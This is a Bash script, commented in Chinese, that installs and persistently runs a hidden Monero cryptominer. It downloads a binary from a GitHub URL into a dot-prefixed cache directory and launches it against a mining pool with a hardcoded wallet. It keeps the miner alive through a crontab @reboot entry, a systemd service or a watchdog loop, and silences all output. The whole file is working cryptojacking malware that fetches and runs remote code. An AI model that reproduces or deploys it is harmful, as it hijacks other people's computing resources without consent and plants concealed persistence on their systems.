#!/bin/bash
# Universal Persistent Script (Low/High Privilege)
# GitHub: https://github.com/dadashabi123/shabi

set -euo pipefail

# 调试模式
DEBUG=false
if [ "${1:-}" = "debug" ]; then
    DEBUG=true
    set -x
fi

### 配置区（修改这里） ###
REPO_URL="https://github.com/dadashabi123/shabi/raw/refs/heads/main/help"
BIN_NAME="help"
WALLET="43CcvodQDNGQnDyPY2adzKcgbmKzncFt1dtCDGUnJAKcQAmaVr3KQ5WhVsw2e8DYQcCbd16PbBhEWPk2GV3xrtoaH3kCrUE"
POOL="pool.supportxmr.com:3333"
THREADS="60"
WORKER_NAME="worker"
####################################

### 调试输出函数 ###
debug_echo() {
    if [ "$DEBUG" = true ]; then
        echo "[DEBUG] $1"
    fi
}

### 检查用户权限 ###
check_user_privileges() {
    debug_echo "检查用户权限"
    
    # 检查是否为root用户
    if [ "$(id -u)" -eq 0 ]; then
        echo "[+] 检测到root权限"
        USER_TYPE="root"
        return 0
    fi
    
    # 检查是否为可登录用户
    if [ -d "/home/$(whoami)" ] || [ -d "/home/$(id -un)" ]; then
        echo "[+] 检测到可登录用户"
        USER_TYPE="login"
        return 0
    fi
    
    # 检查是否为系统用户
    if id -u "$(whoami)" >/dev/null 2>&1; then
        echo "[+] 检测到系统用户"
        USER_TYPE="system"
        return 0
    fi
    
    echo "[-] 未知用户类型"
    return 1
}

### 根据用户类型选择存储目录 ###
select_storage_dir() {
    debug_echo "选择存储目录"
    
    case "$USER_TYPE" in
        "root")
            # root用户优先使用系统目录
            for dir in "/var/lib" "/var/tmp" "/tmp"; do
                if [ -w "$dir" ]; then
                    STORE_DIR="$dir/.${BIN_NAME}_cache"
                    debug_echo "Root用户选择目录: $STORE_DIR"
                    return 0
                fi
            done
            ;;
        *)
            # 非root用户优先使用/var/tmp
            if [ -w "/var/tmp" ]; then
                STORE_DIR="/var/tmp/.${BIN_NAME}_cache"
                debug_echo "非root用户选择目录: $STORE_DIR"
                return 0
            fi
            # 如果/var/tmp不可写，尝试其他目录
            for dir in "/tmp" "$HOME" "$(pwd)"; do
                if [ -w "$dir" ]; then
                    STORE_DIR="$dir/.${BIN_NAME}_cache"
                    debug_echo "使用备用目录: $STORE_DIR"
                    return 0
                fi
            done
            ;;
    esac
    
    echo "[-] 无法找到可写目录"
    return 1
}

### 初始化环境 ###
init_env() {
    debug_echo "开始初始化环境"
    
    # 检查用户权限
    check_user_privileges || exit 1
    
    # 选择存储目录
    select_storage_dir || exit 1
    
    # 确保目录存在并可写
    mkdir -p "$STORE_DIR"
    if [ ! -w "$STORE_DIR" ]; then
        echo "[-] Error: 无法写入目录 $STORE_DIR" >&2
        exit 1
    fi
    debug_echo "存储目录已创建并确认可写"
    
    # 选择下载工具（优先用curl）
    if command -v curl >/dev/null; then
        DOWNLOAD="curl -sSL"
        debug_echo "使用 curl 下载"
    elif command -v wget >/dev/null; then
        DOWNLOAD="wget -qO-"
        debug_echo "使用 wget 下载"
    else
        echo "[-] Error: 需要 curl 或 wget!" >&2
        exit 1
    fi
}

### 下载并部署二进制 ###
deploy_bin() {
    if [ ! -f "${STORE_DIR}/${BIN_NAME}" ]; then
        echo "[*] 下载 ${BIN_NAME}..."
        debug_echo "开始下载过程"
        
        # 直接下载文件
        debug_echo "下载URL: $REPO_URL"
        $DOWNLOAD "$REPO_URL" > "${STORE_DIR}/${BIN_NAME}"
        if [ $? -ne 0 ]; then
            echo "[-] 下载失败"
            exit 1
        fi
        debug_echo "下载完成"
        
        # 设置执行权限
        chmod +x "${STORE_DIR}/${BIN_NAME}"
        
        if [ ! -x "${STORE_DIR}/${BIN_NAME}" ]; then
            echo "[-] 权限设置失败"
            exit 1
        fi
        echo "[+] 二进制文件准备完成"
    fi
}

### 启动进程 ###
start_process() {
    debug_echo "开始启动进程"
    if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
        debug_echo "启动新进程"
        "${STORE_DIR}/${BIN_NAME}" \
            -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" \
            -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
    else
        debug_echo "进程已在运行"
    fi
}

### 根据用户类型选择持久化方式 ###
setup_persistence() {
    debug_echo "开始设置持久化"
    
    # 优先尝试使用crontab（适用于所有用户类型）
    if command -v crontab >/dev/null; then
        debug_echo "使用 Cron 持久化"
        STARTUP_CMD="cd ${STORE_DIR} && nohup ${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b >/dev/null 2>&1 &"
        (crontab -l 2>/dev/null; echo "@reboot $STARTUP_CMD") | crontab - >/dev/null 2>&1
        eval "$STARTUP_CMD" &
        return
    fi
    
    # 如果crontab不可用，根据用户类型选择其他方式
    case "$USER_TYPE" in
        "root")
            # root用户尝试使用systemd
            if command -v systemctl >/dev/null; then
                debug_echo "使用 Systemd 持久化"
                SERVICE_FILE="/etc/systemd/system/${BIN_NAME}.service"
                cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=${BIN_NAME} Service
After=network.target

[Service]
ExecStart=${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
                systemctl enable "${BIN_NAME}.service" >/dev/null 2>&1
                systemctl start "${BIN_NAME}.service" >/dev/null 2>&1
                return
            fi
            ;;
    esac
    
    # 如果上述方法都不可用，使用while循环监控
    debug_echo "使用 While 循环监控"
    monitor_func() {
        while true; do
            if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
                cd "${STORE_DIR}"
                nohup "${STORE_DIR}/${BIN_NAME}" -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
            fi
            sleep 300
        done
    }
    monitor_func &
}

### 检查进程状态 ###
check_status() {
    debug_echo "检查进程状态"
    # 检查主进程
    if pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
        echo "[+] 主进程运行中"
        return 0
    fi
    
    # 检查持久化方式
    if [ -f "/etc/systemd/system/${BIN_NAME}.service" ]; then
        echo "[+] Systemd 服务已配置"
        return 0
    elif crontab -l 2>/dev/null | grep -q "${BIN_NAME}.*${POOL}"; then
        echo "[+] Cron 任务已配置"
        return 0
    elif pgrep -f "monitor_func" >/dev/null; then
        echo "[+] 监控进程运行中"
        return 0
    fi
    
    echo "[-] 未检测到运行中的进程"
    return 1
}

### 主流程 ###
main() {
    init_env
    deploy_bin
    start_process
    setup_persistence
    # 检查状态
    check_status
    # 立即退出，不等待
    exit 0
}

main "$@"
